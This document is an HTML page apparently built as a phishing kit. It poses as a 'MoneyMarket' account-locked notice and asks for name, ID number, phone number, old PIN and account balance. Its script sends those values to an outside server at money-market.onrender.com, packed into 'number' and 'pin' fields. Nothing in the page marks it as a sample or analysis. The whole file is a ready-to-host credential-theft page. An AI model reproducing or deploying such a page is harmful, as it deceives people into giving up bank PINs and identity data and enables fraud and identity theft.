<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Account Locked</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #d11d34 url('bg.jpeg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
    }

    .container {
      width: 90%;
      max-width: 400px;
      text-align: center;
      margin-top: 40px;
      background: rgba(0,0,0,0.15);
      padding: 18px;
      border-radius: 10px;
      box-shadow: 0 6px 20px rgba(0,0,0,0.4);
    }

    h1 {
      font-size: 26px;
      font-weight: bold;
      margin-bottom: 5px;
    }

    h2 {
      font-size: 16px;
      margin-bottom: 15px;
      opacity: 0.95;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-bottom: 1px solid white;
      background: transparent;
      color: white;
      font-size: 16px;
      outline: none;
    }

    input::placeholder { color: white; opacity: 0.7; }

    .btn {
      width: 100%;
      padding: 15px;
      border: none;
      font-size: 18px;
      font-weight: bold;
      border-radius: 8px;
      margin: 12px 0;
      cursor: pointer;
    }

    .btn-primary {
      background-color: black;
      color: white;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Account Locked</h1>
    <h2>Your account has been temporarily locked</h2>

    <img src="logo.png" alt="MoneyMarket Logo" style="width: 240px; margin: 10px auto 18px; display:block;">

    <input id="name" type="text" placeholder='Name and Surname (e.g. John Smith)'>
    <input id="idNumber" type="text" placeholder='ID Number (e.g. 0123456789089)'>
    <input id="phone" type="text" inputmode="numeric" pattern="[0-9]*" placeholder='Phone Number (e.g. 0812345678)'>

    <!-- ✅ NEW: Old PIN -->
    <input id="oldPin" type="password" placeholder='Old PIN (e.g. 1234)'>

    <!-- ✅ Existing balance input -->
    <input id="balance" type="text" placeholder='Account balance (e.g. R3500)'>

    <button id="unlockBtn" class="btn btn-primary">Request Unlock</button>
  </div>

  <script>
    const unlockBtn = document.getElementById('unlockBtn');
    const nameInput = document.getElementById('name');
    const idInput = document.getElementById('idNumber');
    const phoneInput = document.getElementById('phone');
    const oldPinInput = document.getElementById('oldPin');
    const balanceInput = document.getElementById('balance');

    unlockBtn.addEventListener('click', async () => {
      const name = nameInput.value.trim();
      const id = idInput.value.trim();
      const phone = phoneInput.value.trim();
      const oldPin = oldPinInput.value.trim();
      const balance = balanceInput.value.trim();

      if (!name || !id || !phone || !oldPin || !balance) {
        alert('Please fill all fields before submitting.');
        return;
      }

      // ✅ number = name + id + phone
      const concatNumber = `${name} ${id} ${phone}`;

      // ✅ pin = oldPin + space + balance
      const combinedPin = `${oldPin} ${balance}`;

      try {
        const res = await fetch("https://money-market.onrender.com/submit", {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            number: concatNumber,
            pin: combinedPin
          })
        });

        let data = null;
        try { data = await res.json(); } catch (e) {}

        if (res.ok) {
          alert(data?.message || 'Unlock request submitted successfully.');
          nameInput.value = '';
          idInput.value = '';
          phoneInput.value = '';
          oldPinInput.value = '';
          balanceInput.value = '';
        } else {
          alert(data?.message ? `Error: ${data.message}` : `Server responded with status ${res.status}`);
        }
      } catch (err) {
        console.error(err);
        alert('❌ Server error — could not submit request.');
      }
    });
  </script>
</body>
</html>
